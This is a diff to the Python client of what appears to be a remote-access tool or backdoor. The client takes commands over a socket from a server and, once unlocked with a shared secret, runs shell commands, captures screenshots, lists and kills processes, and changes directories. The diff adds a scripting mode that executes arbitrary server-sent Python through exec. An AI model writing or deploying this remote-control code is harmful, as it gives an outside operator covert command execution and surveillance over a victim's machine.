@@ -473,6 +473,17 @@ def terminateProcess(PID):
     TerminateProcess(hProcess, 1)
 
 
+def executeScript(source):
+    mprint = ''
+    try:
+        exec source
+        if mprint == '':
+            return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
+        return str(mprint)
+    except Exception as e:
+        return str(e)
+
+
 def send_info(sock):
     global ACTIVE
 
@@ -507,7 +518,7 @@ def reactor():
 
                 # Begin Init
                 data = data_receive(server_socket)
-                if data['payload'] == 'connectSuccess':
+                if data['mode'] == 'connectSuccess':
                     key = get_key()
                     if len(key) != 0:
                         ID = key
@@ -528,8 +539,8 @@ def reactor():
                         except socket.error:
                             break
 
-                        if data['payload'].startswith('unlockClient '):
-                            pass_key = data['payload'].split()[-1]
+                        if data['mode'] == 'unlockClient':
+                            pass_key = data['payload']
                             if pass_key == SECRET:
                                 UNLOCKED = True
 
@@ -541,38 +552,47 @@ def reactor():
                                         data = data_receive(server_socket)
 
                                         # Lock Client
-                                        if data['payload'] == 'lockClient':
+                                        if data['mode'] == 'lockClient':
                                             UNLOCKED = False
                                             continue
 
                                         # Terminate Client
-                                        if data['payload'] == 'terminateClient':
+                                        if data['mode'] == 'terminateClient':
                                             os._exit(1)
 
-                                        # Choose dir
-                                        elif data['payload'].startswith('cd '):
+                                        # Explorer Commands
+                                        elif data['mode'] == 'explorerMode' and data['payload'].startswith('cd '):
                                             try:
                                                 os.chdir(data['payload'][3:])
                                                 output = ''
                                             except:
                                                 output = 'dirOpenError'
 
-                                        elif data['payload'] == 'getScreen':
+                                        # Execute Script
+                                        elif data['mode'] == 'scriptingMode':
+                                            output = executeScript(data['payload'])
+
+                                        elif data['mode'] == 'getScreen':
                                             output = get_screenshot()
 
                                         # Get Processes List
-                                        elif data['payload'] == 'getProcessesList':
+                                        elif data['mode'] == 'getProcessesList':
                                             output = get_processes_list()
 
                                         # Terminate Process
-                                        elif data['payload'].startswith('terminateProcess '):
-                                            pid = data['payload'].split()[-1]
-                                            terminateProcess(int(pid))
+                                        elif data['mode'] == 'terminateProcess':
+                                            terminateProcess(data['payload'])
                                             continue
+
+                                        # Shell Mode
+                                        elif data['mode'] == 'shellMode':
+                                            output = run_shell(data['payload'])
 
                                         # Run Shell
                                         else:
-                                            output = run_shell(data['payload'])
+                                            data_send(server_socket, 'unknownCommandError', 'unknownCommandError', session_id=data['session_id'])
+                                            continue
+
                                         data_send(server_socket, output, 'clientMode', session_id=data['session_id'])
 
                                     except socket.error:
@@ -581,7 +601,7 @@ def reactor():
                                         break
 
                             else:
-                                data_send(server_socket, 'notAuthorized', 'notAuthorized')
+                                data_send(server_socket, 'notAuthorized', 'notAuthorized', session_id=data['session_id'])
 
                         # Lock Client Functions
                         # Desktop Screenshot
